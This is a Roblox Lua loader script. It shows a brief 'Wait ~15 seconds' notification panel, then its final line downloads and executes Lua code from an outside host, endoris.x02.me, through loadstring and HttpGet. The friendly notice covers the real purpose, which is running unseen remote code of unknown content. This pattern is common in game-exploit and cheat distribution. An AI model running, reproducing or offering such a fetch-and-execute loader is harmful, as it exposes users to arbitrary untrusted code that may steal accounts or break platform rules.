local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local localPlayer = Players.LocalPlayer
local gui = Instance.new("ScreenGui", localPlayer:WaitForChild("PlayerGui"))  
local frame = Instance.new("Frame", gui)  
frame.Size = UDim2.new(0, 300, 0, 50)  
frame.Position = UDim2.new(1, 0, 1, -70)  
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)  
frame.BackgroundTransparency = 0.2  
local corner = Instance.new("UICorner", frame)  
corner.CornerRadius = UDim.new(0, 8)  
local label = Instance.new("TextLabel", frame)  
label.Size = UDim2.new(1, 0, 1, 0)  
label.BackgroundTransparency = 1  
label.Text = "Wait ~15 seconds (can lag)"  
label.TextColor3 = Color3.fromRGB(255, 255, 255)  
label.TextSize = 18  
label.Font = Enum.Font.SourceSansBold  

TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
    Position = UDim2.new(1, -320, 1, -70)
}):Play()  

task.wait(2)  

TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
    Position = UDim2.new(1, 0, 1, -70)
}):Play()  

task.wait(0.5)  
gui:Destroy()  
loadstring(game:HttpGet("https://endoris.x02.me/i/AZHS.lua"))()
